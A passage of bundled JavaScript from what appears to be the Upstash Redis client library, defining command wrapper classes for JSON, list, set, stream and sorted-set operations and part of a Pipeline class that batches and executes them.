        super(["incrbyfloat", ...cmd], opts);
      }
    };
    JsonArrAppendCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.ARRAPPEND", ...cmd], opts);
      }
    };
    JsonArrIndexCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.ARRINDEX", ...cmd], opts);
      }
    };
    JsonArrInsertCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.ARRINSERT", ...cmd], opts);
      }
    };
    JsonArrLenCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.ARRLEN", cmd[0], cmd[1] ?? "$"], opts);
      }
    };
    JsonArrPopCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.ARRPOP", ...cmd], opts);
      }
    };
    JsonArrTrimCommand = class extends Command {
      constructor(cmd, opts) {
        const path = cmd[1] ?? "$";
        const start = cmd[2] ?? 0;
        const stop = cmd[3] ?? 0;
        super(["JSON.ARRTRIM", cmd[0], path, start, stop], opts);
      }
    };
    JsonClearCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.CLEAR", ...cmd], opts);
      }
    };
    JsonDelCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.DEL", ...cmd], opts);
      }
    };
    JsonForgetCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.FORGET", ...cmd], opts);
      }
    };
    JsonGetCommand = class extends Command {
      constructor(cmd, opts) {
        const command = ["JSON.GET"];
        if (typeof cmd[1] === "string") {
          command.push(...cmd);
        } else {
          command.push(cmd[0]);
          if (cmd[1]) {
            if (cmd[1].indent) {
              command.push("INDENT", cmd[1].indent);
            }
            if (cmd[1].newline) {
              command.push("NEWLINE", cmd[1].newline);
            }
            if (cmd[1].space) {
              command.push("SPACE", cmd[1].space);
            }
          }
          command.push(...cmd.slice(2));
        }
        super(command, opts);
      }
    };
    JsonMergeCommand = class extends Command {
      constructor(cmd, opts) {
        const command = ["JSON.MERGE", ...cmd];
        super(command, opts);
      }
    };
    JsonMGetCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.MGET", ...cmd[0], cmd[1]], opts);
      }
    };
    JsonMSetCommand = class extends Command {
      constructor(cmd, opts) {
        const command = ["JSON.MSET"];
        for (const c of cmd) {
          command.push(c.key, c.path, c.value);
        }
        super(command, opts);
      }
    };
    JsonNumIncrByCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.NUMINCRBY", ...cmd], opts);
      }
    };
    JsonNumMultByCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.NUMMULTBY", ...cmd], opts);
      }
    };
    JsonObjKeysCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.OBJKEYS", ...cmd], opts);
      }
    };
    JsonObjLenCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.OBJLEN", ...cmd], opts);
      }
    };
    JsonRespCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.RESP", ...cmd], opts);
      }
    };
    JsonSetCommand = class extends Command {
      constructor(cmd, opts) {
        const command = ["JSON.SET", cmd[0], cmd[1], cmd[2]];
        if (cmd[3]) {
          if (cmd[3].nx) {
            command.push("NX");
          } else if (cmd[3].xx) {
            command.push("XX");
          }
        }
        super(command, opts);
      }
    };
    JsonStrAppendCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.STRAPPEND", ...cmd], opts);
      }
    };
    JsonStrLenCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.STRLEN", ...cmd], opts);
      }
    };
    JsonToggleCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.TOGGLE", ...cmd], opts);
      }
    };
    JsonTypeCommand = class extends Command {
      constructor(cmd, opts) {
        super(["JSON.TYPE", ...cmd], opts);
      }
    };
    KeysCommand = class extends Command {
      constructor(cmd, opts) {
        super(["keys", ...cmd], opts);
      }
    };
    LIndexCommand = class extends Command {
      constructor(cmd, opts) {
        super(["lindex", ...cmd], opts);
      }
    };
    LInsertCommand = class extends Command {
      constructor(cmd, opts) {
        super(["linsert", ...cmd], opts);
      }
    };
    LLenCommand = class extends Command {
      constructor(cmd, opts) {
        super(["llen", ...cmd], opts);
      }
    };
    LMoveCommand = class extends Command {
      constructor(cmd, opts) {
        super(["lmove", ...cmd], opts);
      }
    };
    LmPopCommand = class extends Command {
      constructor(cmd, opts) {
        const [numkeys, keys, direction, count] = cmd;
        super(["LMPOP", numkeys, ...keys, direction, ...count ? ["COUNT", count] : []], opts);
      }
    };
    LPopCommand = class extends Command {
      constructor(cmd, opts) {
        super(["lpop", ...cmd], opts);
      }
    };
    LPosCommand = class extends Command {
      constructor(cmd, opts) {
        const args = ["lpos", cmd[0], cmd[1]];
        if (typeof cmd[2]?.rank === "number") {
          args.push("rank", cmd[2].rank);
        }
        if (typeof cmd[2]?.count === "number") {
          args.push("count", cmd[2].count);
        }
        if (typeof cmd[2]?.maxLen === "number") {
          args.push("maxLen", cmd[2].maxLen);
        }
        super(args, opts);
      }
    };
    LPushCommand = class extends Command {
      constructor(cmd, opts) {
        super(["lpush", ...cmd], opts);
      }
    };
    LPushXCommand = class extends Command {
      constructor(cmd, opts) {
        super(["lpushx", ...cmd], opts);
      }
    };
    LRangeCommand = class extends Command {
      constructor(cmd, opts) {
        super(["lrange", ...cmd], opts);
      }
    };
    LRemCommand = class extends Command {
      constructor(cmd, opts) {
        super(["lrem", ...cmd], opts);
      }
    };
    LSetCommand = class extends Command {
      constructor(cmd, opts) {
        super(["lset", ...cmd], opts);
      }
    };
    LTrimCommand = class extends Command {
      constructor(cmd, opts) {
        super(["ltrim", ...cmd], opts);
      }
    };
    MGetCommand = class extends Command {
      constructor(cmd, opts) {
        const keys = Array.isArray(cmd[0]) ? cmd[0] : cmd;
        super(["mget", ...keys], opts);
      }
    };
    MSetCommand = class extends Command {
      constructor([kv], opts) {
        super(["mset", ...Object.entries(kv).flatMap(([key, value]) => [key, value])], opts);
      }
    };
    MSetNXCommand = class extends Command {
      constructor([kv], opts) {
        super(["msetnx", ...Object.entries(kv).flat()], opts);
      }
    };
    PersistCommand = class extends Command {
      constructor(cmd, opts) {
        super(["persist", ...cmd], opts);
      }
    };
    PExpireCommand = class extends Command {
      constructor(cmd, opts) {
        super(["pexpire", ...cmd], opts);
      }
    };
    PExpireAtCommand = class extends Command {
      constructor(cmd, opts) {
        super(["pexpireat", ...cmd], opts);
      }
    };
    PfAddCommand = class extends Command {
      constructor(cmd, opts) {
        super(["pfadd", ...cmd], opts);
      }
    };
    PfCountCommand = class extends Command {
      constructor(cmd, opts) {
        super(["pfcount", ...cmd], opts);
      }
    };
    PfMergeCommand = class extends Command {
      constructor(cmd, opts) {
        super(["pfmerge", ...cmd], opts);
      }
    };
    PingCommand = class extends Command {
      constructor(cmd, opts) {
        const command = ["ping"];
        if (cmd?.[0] !== void 0) {
          command.push(cmd[0]);
        }
        super(command, opts);
      }
    };
    PSetEXCommand = class extends Command {
      constructor(cmd, opts) {
        super(["psetex", ...cmd], opts);
      }
    };
    PTtlCommand = class extends Command {
      constructor(cmd, opts) {
        super(["pttl", ...cmd], opts);
      }
    };
    PublishCommand = class extends Command {
      constructor(cmd, opts) {
        super(["publish", ...cmd], opts);
      }
    };
    RandomKeyCommand = class extends Command {
      constructor(opts) {
        super(["randomkey"], opts);
      }
    };
    RenameCommand = class extends Command {
      constructor(cmd, opts) {
        super(["rename", ...cmd], opts);
      }
    };
    RenameNXCommand = class extends Command {
      constructor(cmd, opts) {
        super(["renamenx", ...cmd], opts);
      }
    };
    RPopCommand = class extends Command {
      constructor(cmd, opts) {
        super(["rpop", ...cmd], opts);
      }
    };
    RPushCommand = class extends Command {
      constructor(cmd, opts) {
        super(["rpush", ...cmd], opts);
      }
    };
    RPushXCommand = class extends Command {
      constructor(cmd, opts) {
        super(["rpushx", ...cmd], opts);
      }
    };
    SAddCommand = class extends Command {
      constructor(cmd, opts) {
        super(["sadd", ...cmd], opts);
      }
    };
    ScanCommand = class extends Command {
      constructor([cursor, opts], cmdOpts) {
        const command = ["scan", cursor];
        if (opts?.match) {
          command.push("match", opts.match);
        }
        if (typeof opts?.count === "number") {
          command.push("count", opts.count);
        }
        if (opts && "withType" in opts && opts.withType === true) {
          command.push("withtype");
        } else if (opts && "type" in opts && opts.type && opts.type.length > 0) {
          command.push("type", opts.type);
        }
        super(command, {
          // @ts-expect-error ignore types here
          deserialize: opts?.withType ? deserializeScanWithTypesResponse : deserializeScanResponse,
          ...cmdOpts
        });
      }
    };
    SCardCommand = class extends Command {
      constructor(cmd, opts) {
        super(["scard", ...cmd], opts);
      }
    };
    ScriptExistsCommand = class extends Command {
      constructor(hashes, opts) {
        super(["script", "exists", ...hashes], {
          deserialize: (result) => result,
          ...opts
        });
      }
    };
    ScriptFlushCommand = class extends Command {
      constructor([opts], cmdOpts) {
        const cmd = ["script", "flush"];
        if (opts?.sync) {
          cmd.push("sync");
        } else if (opts?.async) {
          cmd.push("async");
        }
        super(cmd, cmdOpts);
      }
    };
    ScriptLoadCommand = class extends Command {
      constructor(args, opts) {
        super(["script", "load", ...args], opts);
      }
    };
    SDiffCommand = class extends Command {
      constructor(cmd, opts) {
        super(["sdiff", ...cmd], opts);
      }
    };
    SDiffStoreCommand = class extends Command {
      constructor(cmd, opts) {
        super(["sdiffstore", ...cmd], opts);
      }
    };
    SetCommand = class extends Command {
      constructor([key, value, opts], cmdOpts) {
        const command = ["set", key, value];
        if (opts) {
          if ("nx" in opts && opts.nx) {
            command.push("nx");
          } else if ("xx" in opts && opts.xx) {
            command.push("xx");
          }
          if ("get" in opts && opts.get) {
            command.push("get");
          }
          if ("ex" in opts && typeof opts.ex === "number") {
            command.push("ex", opts.ex);
          } else if ("px" in opts && typeof opts.px === "number") {
            command.push("px", opts.px);
          } else if ("exat" in opts && typeof opts.exat === "number") {
            command.push("exat", opts.exat);
          } else if ("pxat" in opts && typeof opts.pxat === "number") {
            command.push("pxat", opts.pxat);
          } else if ("keepTtl" in opts && opts.keepTtl) {
            command.push("keepTtl");
          }
        }
        super(command, cmdOpts);
      }
    };
    SetBitCommand = class extends Command {
      constructor(cmd, opts) {
        super(["setbit", ...cmd], opts);
      }
    };
    SetExCommand = class extends Command {
      constructor(cmd, opts) {
        super(["setex", ...cmd], opts);
      }
    };
    SetNxCommand = class extends Command {
      constructor(cmd, opts) {
        super(["setnx", ...cmd], opts);
      }
    };
    SetRangeCommand = class extends Command {
      constructor(cmd, opts) {
        super(["setrange", ...cmd], opts);
      }
    };
    SInterCommand = class extends Command {
      constructor(cmd, opts) {
        super(["sinter", ...cmd], opts);
      }
    };
    SInterStoreCommand = class extends Command {
      constructor(cmd, opts) {
        super(["sinterstore", ...cmd], opts);
      }
    };
    SIsMemberCommand = class extends Command {
      constructor(cmd, opts) {
        super(["sismember", ...cmd], opts);
      }
    };
    SMembersCommand = class extends Command {
      constructor(cmd, opts) {
        super(["smembers", ...cmd], opts);
      }
    };
    SMIsMemberCommand = class extends Command {
      constructor(cmd, opts) {
        super(["smismember", cmd[0], ...cmd[1]], opts);
      }
    };
    SMoveCommand = class extends Command {
      constructor(cmd, opts) {
        super(["smove", ...cmd], opts);
      }
    };
    SPopCommand = class extends Command {
      constructor([key, count], opts) {
        const command = ["spop", key];
        if (typeof count === "number") {
          command.push(count);
        }
        super(command, opts);
      }
    };
    SRandMemberCommand = class extends Command {
      constructor([key, count], opts) {
        const command = ["srandmember", key];
        if (typeof count === "number") {
          command.push(count);
        }
        super(command, opts);
      }
    };
    SRemCommand = class extends Command {
      constructor(cmd, opts) {
        super(["srem", ...cmd], opts);
      }
    };
    SScanCommand = class extends Command {
      constructor([key, cursor, opts], cmdOpts) {
        const command = ["sscan", key, cursor];
        if (opts?.match) {
          command.push("match", opts.match);
        }
        if (typeof opts?.count === "number") {
          command.push("count", opts.count);
        }
        super(command, {
          deserialize: deserializeScanResponse,
          ...cmdOpts
        });
      }
    };
    StrLenCommand = class extends Command {
      constructor(cmd, opts) {
        super(["strlen", ...cmd], opts);
      }
    };
    SUnionCommand = class extends Command {
      constructor(cmd, opts) {
        super(["sunion", ...cmd], opts);
      }
    };
    SUnionStoreCommand = class extends Command {
      constructor(cmd, opts) {
        super(["sunionstore", ...cmd], opts);
      }
    };
    TimeCommand = class extends Command {
      constructor(opts) {
        super(["time"], opts);
      }
    };
    TouchCommand = class extends Command {
      constructor(cmd, opts) {
        super(["touch", ...cmd], opts);
      }
    };
    TtlCommand = class extends Command {
      constructor(cmd, opts) {
        super(["ttl", ...cmd], opts);
      }
    };
    TypeCommand = class extends Command {
      constructor(cmd, opts) {
        super(["type", ...cmd], opts);
      }
    };
    UnlinkCommand = class extends Command {
      constructor(cmd, opts) {
        super(["unlink", ...cmd], opts);
      }
    };
    XAckCommand = class extends Command {
      constructor([key, group, id], opts) {
        const ids = Array.isArray(id) ? [...id] : [id];
        super(["XACK", key, group, ...ids], opts);
      }
    };
    XAddCommand = class extends Command {
      constructor([key, id, entries, opts], commandOptions) {
        const command = ["XADD", key];
        if (opts) {
          if (opts.nomkStream) {
            command.push("NOMKSTREAM");
          }
          if (opts.trim) {
            command.push(opts.trim.type, opts.trim.comparison, opts.trim.threshold);
            if (opts.trim.limit !== void 0) {
              command.push("LIMIT", opts.trim.limit);
            }
          }
        }
        command.push(id);
        for (const [k, v] of Object.entries(entries)) {
          command.push(k, v);
        }
        super(command, commandOptions);
      }
    };
    XAutoClaim = class extends Command {
      constructor([key, group, consumer, minIdleTime, start, options], opts) {
        const commands = [];
        if (options?.count) {
          commands.push("COUNT", options.count);
        }
        if (options?.justId) {
          commands.push("JUSTID");
        }
        super(["XAUTOCLAIM", key, group, consumer, minIdleTime, start, ...commands], opts);
      }
    };
    XClaimCommand = class extends Command {
      constructor([key, group, consumer, minIdleTime, id, options], opts) {
        const ids = Array.isArray(id) ? [...id] : [id];
        const commands = [];
        if (options?.idleMS) {
          commands.push("IDLE", options.idleMS);
        }
        if (options?.idleMS) {
          commands.push("TIME", options.timeMS);
        }
        if (options?.retryCount) {
          commands.push("RETRYCOUNT", options.retryCount);
        }
        if (options?.force) {
          commands.push("FORCE");
        }
        if (options?.justId) {
          commands.push("JUSTID");
        }
        if (options?.lastId) {
          commands.push("LASTID", options.lastId);
        }
        super(["XCLAIM", key, group, consumer, minIdleTime, ...ids, ...commands], opts);
      }
    };
    XDelCommand = class extends Command {
      constructor([key, ids], opts) {
        const cmds = Array.isArray(ids) ? [...ids] : [ids];
        super(["XDEL", key, ...cmds], opts);
      }
    };
    XGroupCommand = class extends Command {
      constructor([key, opts], commandOptions) {
        const command = ["XGROUP"];
        switch (opts.type) {
          case "CREATE": {
            command.push("CREATE", key, opts.group, opts.id);
            if (opts.options) {
              if (opts.options.MKSTREAM) {
                command.push("MKSTREAM");
              }
              if (opts.options.ENTRIESREAD !== void 0) {
                command.push("ENTRIESREAD", opts.options.ENTRIESREAD.toString());
              }
            }
            break;
          }
          case "CREATECONSUMER": {
            command.push("CREATECONSUMER", key, opts.group, opts.consumer);
            break;
          }
          case "DELCONSUMER": {
            command.push("DELCONSUMER", key, opts.group, opts.consumer);
            break;
          }
          case "DESTROY": {
            command.push("DESTROY", key, opts.group);
            break;
          }
          case "SETID": {
            command.push("SETID", key, opts.group, opts.id);
            if (opts.options?.ENTRIESREAD !== void 0) {
              command.push("ENTRIESREAD", opts.options.ENTRIESREAD.toString());
            }
            break;
          }
          default: {
            throw new Error("Invalid XGROUP");
          }
        }
        super(command, commandOptions);
      }
    };
    XInfoCommand = class extends Command {
      constructor([key, options], opts) {
        const cmds = [];
        if (options.type === "CONSUMERS") {
          cmds.push("CONSUMERS", key, options.group);
        } else {
          cmds.push("GROUPS", key);
        }
        super(["XINFO", ...cmds], opts);
      }
    };
    XLenCommand = class extends Command {
      constructor(cmd, opts) {
        super(["XLEN", ...cmd], opts);
      }
    };
    XPendingCommand = class extends Command {
      constructor([key, group, start, end, count, options], opts) {
        const consumers = options?.consumer === void 0 ? [] : Array.isArray(options.consumer) ? [...options.consumer] : [options.consumer];
        super(
          [
            "XPENDING",
            key,
            group,
            ...options?.idleTime ? ["IDLE", options.idleTime] : [],
            start,
            end,
            count,
            ...consumers
          ],
          opts
        );
      }
    };
    XRangeCommand = class extends Command {
      constructor([key, start, end, count], opts) {
        const command = ["XRANGE", key, start, end];
        if (typeof count === "number") {
          command.push("COUNT", count);
        }
        super(command, {
          deserialize: (result) => deserialize4(result),
          ...opts
        });
      }
    };
    UNBALANCED_XREAD_ERR = "ERR Unbalanced XREAD list of streams: for each stream key an ID or '$' must be specified";
    XReadCommand = class extends Command {
      constructor([key, id, options], opts) {
        if (Array.isArray(key) && Array.isArray(id) && key.length !== id.length) {
          throw new Error(UNBALANCED_XREAD_ERR);
        }
        const commands = [];
        if (typeof options?.count === "number") {
          commands.push("COUNT", options.count);
        }
        if (typeof options?.blockMS === "number") {
          commands.push("BLOCK", options.blockMS);
        }
        commands.push(
          "STREAMS",
          ...Array.isArray(key) ? [...key] : [key],
          ...Array.isArray(id) ? [...id] : [id]
        );
        super(["XREAD", ...commands], opts);
      }
    };
    UNBALANCED_XREADGROUP_ERR = "ERR Unbalanced XREADGROUP list of streams: for each stream key an ID or '$' must be specified";
    XReadGroupCommand = class extends Command {
      constructor([group, consumer, key, id, options], opts) {
        if (Array.isArray(key) && Array.isArray(id) && key.length !== id.length) {
          throw new Error(UNBALANCED_XREADGROUP_ERR);
        }
        const commands = [];
        if (typeof options?.count === "number") {
          commands.push("COUNT", options.count);
        }
        if (typeof options?.blockMS === "number") {
          commands.push("BLOCK", options.blockMS);
        }
        if (typeof options?.NOACK === "boolean" && options.NOACK) {
          commands.push("NOACK");
        }
        commands.push(
          "STREAMS",
          ...Array.isArray(key) ? [...key] : [key],
          ...Array.isArray(id) ? [...id] : [id]
        );
        super(["XREADGROUP", "GROUP", group, consumer, ...commands], opts);
      }
    };
    XRevRangeCommand = class extends Command {
      constructor([key, end, start, count], opts) {
        const command = ["XREVRANGE", key, end, start];
        if (typeof count === "number") {
          command.push("COUNT", count);
        }
        super(command, {
          deserialize: (result) => deserialize5(result),
          ...opts
        });
      }
    };
    XTrimCommand = class extends Command {
      constructor([key, options], opts) {
        const { limit, strategy, threshold, exactness = "~" } = options;
        super(["XTRIM", key, strategy, exactness, threshold, ...limit ? ["LIMIT", limit] : []], opts);
      }
    };
    ZAddCommand = class extends Command {
      constructor([key, arg1, ...arg2], opts) {
        const command = ["zadd", key];
        if ("nx" in arg1 && arg1.nx) {
          command.push("nx");
        } else if ("xx" in arg1 && arg1.xx) {
          command.push("xx");
        }
        if ("ch" in arg1 && arg1.ch) {
          command.push("ch");
        }
        if ("incr" in arg1 && arg1.incr) {
          command.push("incr");
        }
        if ("lt" in arg1 && arg1.lt) {
          command.push("lt");
        } else if ("gt" in arg1 && arg1.gt) {
          command.push("gt");
        }
        if ("score" in arg1 && "member" in arg1) {
          command.push(arg1.score, arg1.member);
        }
        command.push(...arg2.flatMap(({ score, member }) => [score, member]));
        super(command, opts);
      }
    };
    ZCardCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zcard", ...cmd], opts);
      }
    };
    ZCountCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zcount", ...cmd], opts);
      }
    };
    ZIncrByCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zincrby", ...cmd], opts);
      }
    };
    ZInterStoreCommand = class extends Command {
      constructor([destination, numKeys, keyOrKeys, opts], cmdOpts) {
        const command = ["zinterstore", destination, numKeys];
        if (Array.isArray(keyOrKeys)) {
          command.push(...keyOrKeys);
        } else {
          command.push(keyOrKeys);
        }
        if (opts) {
          if ("weights" in opts && opts.weights) {
            command.push("weights", ...opts.weights);
          } else if ("weight" in opts && typeof opts.weight === "number") {
            command.push("weights", opts.weight);
          }
          if ("aggregate" in opts) {
            command.push("aggregate", opts.aggregate);
          }
        }
        super(command, cmdOpts);
      }
    };
    ZLexCountCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zlexcount", ...cmd], opts);
      }
    };
    ZPopMaxCommand = class extends Command {
      constructor([key, count], opts) {
        const command = ["zpopmax", key];
        if (typeof count === "number") {
          command.push(count);
        }
        super(command, opts);
      }
    };
    ZPopMinCommand = class extends Command {
      constructor([key, count], opts) {
        const command = ["zpopmin", key];
        if (typeof count === "number") {
          command.push(count);
        }
        super(command, opts);
      }
    };
    ZRangeCommand = class extends Command {
      constructor([key, min, max, opts], cmdOpts) {
        const command = ["zrange", key, min, max];
        if (opts?.byScore) {
          command.push("byscore");
        }
        if (opts?.byLex) {
          command.push("bylex");
        }
        if (opts?.rev) {
          command.push("rev");
        }
        if (opts?.count !== void 0 && opts.offset !== void 0) {
          command.push("limit", opts.offset, opts.count);
        }
        if (opts?.withScores) {
          command.push("withscores");
        }
        super(command, cmdOpts);
      }
    };
    ZRankCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zrank", ...cmd], opts);
      }
    };
    ZRemCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zrem", ...cmd], opts);
      }
    };
    ZRemRangeByLexCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zremrangebylex", ...cmd], opts);
      }
    };
    ZRemRangeByRankCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zremrangebyrank", ...cmd], opts);
      }
    };
    ZRemRangeByScoreCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zremrangebyscore", ...cmd], opts);
      }
    };
    ZRevRankCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zrevrank", ...cmd], opts);
      }
    };
    ZScanCommand = class extends Command {
      constructor([key, cursor, opts], cmdOpts) {
        const command = ["zscan", key, cursor];
        if (opts?.match) {
          command.push("match", opts.match);
        }
        if (typeof opts?.count === "number") {
          command.push("count", opts.count);
        }
        super(command, {
          deserialize: deserializeScanResponse,
          ...cmdOpts
        });
      }
    };
    ZScoreCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zscore", ...cmd], opts);
      }
    };
    ZUnionCommand = class extends Command {
      constructor([numKeys, keyOrKeys, opts], cmdOpts) {
        const command = ["zunion", numKeys];
        if (Array.isArray(keyOrKeys)) {
          command.push(...keyOrKeys);
        } else {
          command.push(keyOrKeys);
        }
        if (opts) {
          if ("weights" in opts && opts.weights) {
            command.push("weights", ...opts.weights);
          } else if ("weight" in opts && typeof opts.weight === "number") {
            command.push("weights", opts.weight);
          }
          if ("aggregate" in opts) {
            command.push("aggregate", opts.aggregate);
          }
          if (opts.withScores) {
            command.push("withscores");
          }
        }
        super(command, cmdOpts);
      }
    };
    ZUnionStoreCommand = class extends Command {
      constructor([destination, numKeys, keyOrKeys, opts], cmdOpts) {
        const command = ["zunionstore", destination, numKeys];
        if (Array.isArray(keyOrKeys)) {
          command.push(...keyOrKeys);
        } else {
          command.push(keyOrKeys);
        }
        if (opts) {
          if ("weights" in opts && opts.weights) {
            command.push("weights", ...opts.weights);
          } else if ("weight" in opts && typeof opts.weight === "number") {
            command.push("weights", opts.weight);
          }
          if ("aggregate" in opts) {
            command.push("aggregate", opts.aggregate);
          }
        }
        super(command, cmdOpts);
      }
    };
    ZDiffStoreCommand = class extends Command {
      constructor(cmd, opts) {
        super(["zdiffstore", ...cmd], opts);
      }
    };
    ZMScoreCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, members] = cmd;
        super(["zmscore", key, ...members], opts);
      }
    };
    Pipeline = class {
      client;
      commands;
      commandOptions;
      multiExec;
      constructor(opts) {
        this.client = opts.client;
        this.commands = [];
        this.commandOptions = opts.commandOptions;
        this.multiExec = opts.multiExec ?? false;
        if (this.commandOptions?.latencyLogging) {
          const originalExec = this.exec.bind(this);
          this.exec = async (options) => {
            const start = performance.now();
            const result = await (options ? originalExec(options) : originalExec());
            const end = performance.now();
            const loggerResult = (end - start).toFixed(2);
            console.log(
              `Latency for \x1B[38;2;19;185;39m${this.multiExec ? ["MULTI-EXEC"] : ["PIPELINE"].toString().toUpperCase()}\x1B[0m: \x1B[38;2;0;255;255m${loggerResult} ms\x1B[0m`
            );
            return result;
          };
        }
      }
      exec = async (options) => {
        if (this.commands.length === 0) {
          throw new Error("Pipeline is empty");
        }
        const path = this.multiExec ? ["multi-exec"] : ["pipeline"];
        const res = await this.client.request({
          path,
          body: Object.values(this.commands).map((c) => c.command)
        });
        return options?.keepErrors ? res.map(({ error, result }, i) => {
          return {
            error,
            result: this.commands[i].deserialize(result)
          };
        }) : res.map(({ error, result }, i) => {
          if (error) {
            throw new UpstashError(
              `Command ${i + 1} [ ${this.commands[i].command[0]} ] failed: ${error}`
            );
          }
          return this.commands[i].deserialize(result);
        });
      };
      /**
       * Returns the length of pipeline before the execution
       */
      length() {
        return this.commands.length;
      }
      /**
       * Pushes a command into the pipeline and returns a chainable instance of the
       * pipeline
       */
      chain(command) {
        this.commands.push(command);
        return this;
      }
      /**
       * @see https://redis.io/commands/append
       */
      append = (...args) => this.chain(new AppendCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/bitcount
       */
      bitcount = (...args) => this.chain(new BitCountCommand(args, this.commandOptions));
      /**
       * Returns an instance that can be used to execute `BITFIELD` commands on one key.
       *
       * @example
       * ```typescript
       * redis.set("mykey", 0);
       * const result = await redis.pipeline()
       *   .bitfield("mykey")
       *   .set("u4", 0, 16)
       *   .incr("u4", "#1", 1)
       *   .exec();
       * console.log(result); // [[0, 1]]
       * ```
       *
       * @see https://redis.io/commands/bitfield
       */
      bitfield = (...args) => new BitFieldCommand(args, this.client, this.commandOptions, this.chain.bind(this));
      /**
       * @see https://redis.io/commands/bitop
       */
      bitop = (op, destinationKey, sourceKey, ...sourceKeys) => this.chain(
        new BitOpCommand([op, destinationKey, sourceKey, ...sourceKeys], this.commandOptions)
      );
      /**
       * @see https://redis.io/commands/bitpos
       */
      bitpos = (...args) => this.chain(new BitPosCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/copy
       */
      copy = (...args) => this.chain(new CopyCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zdiffstore
       */
      zdiffstore = (...args) => this.chain(new ZDiffStoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/dbsize
       */
      dbsize = () => this.chain(new DBSizeCommand(this.commandOptions));
      /**
       * @see https://redis.io/commands/decr
       */
      decr = (...args) => this.chain(new DecrCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/decrby
       */
      decrby = (...args) => this.chain(new DecrByCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/del
       */
      del = (...args) => this.chain(new DelCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/echo
       */
      echo = (...args) => this.chain(new EchoCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/eval_ro
       */
      evalRo = (...args) => this.chain(new EvalROCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/eval
       */
      eval = (...args) => this.chain(new EvalCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/evalsha_ro
       */
      evalshaRo = (...args) => this.chain(new EvalshaROCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/evalsha
       */
      evalsha = (...args) => this.chain(new EvalshaCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/exists
       */
      exists = (...args) => this.chain(new ExistsCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/expire
       */
      expire = (...args) => this.chain(new ExpireCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/expireat
       */
      expireat = (...args) => this.chain(new ExpireAtCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/flushall
       */
      flushall = (args) => this.chain(new FlushAllCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/flushdb
       */
      flushdb = (...args) => this.chain(new FlushDBCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/geoadd
       */
      geoadd = (...args) => this.chain(new GeoAddCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/geodist
       */
      geodist = (...args) => this.chain(new GeoDistCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/geopos
       */
      geopos = (...args) => this.chain(new GeoPosCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/geohash
       */
      geohash = (...args) => this.chain(new GeoHashCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/geosearch
       */
      geosearch = (...args) => this.chain(new GeoSearchCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/geosearchstore
       */
      geosearchstore = (...args) => this.chain(new GeoSearchStoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/get
       */
      get = (...args) => this.chain(new GetCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/getbit
       */
      getbit = (...args) => this.chain(new GetBitCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/getdel
       */
      getdel = (...args) => this.chain(new GetDelCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/getex
       */
      getex = (...args) => this.chain(new GetExCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/getrange
       */
      getrange = (...args) => this.chain(new GetRangeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/getset
       */
      getset = (key, value) => this.chain(new GetSetCommand([key, value], this.commandOptions));
      /**
       * @see https://redis.io/commands/hdel
       */
      hdel = (...args) => this.chain(new HDelCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hexists
       */
      hexists = (...args) => this.chain(new HExistsCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hexpire
       */
      hexpire = (...args) => this.chain(new HExpireCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hexpireat
       */
      hexpireat = (...args) => this.chain(new HExpireAtCommand(args, this.commandOptions));
      /**
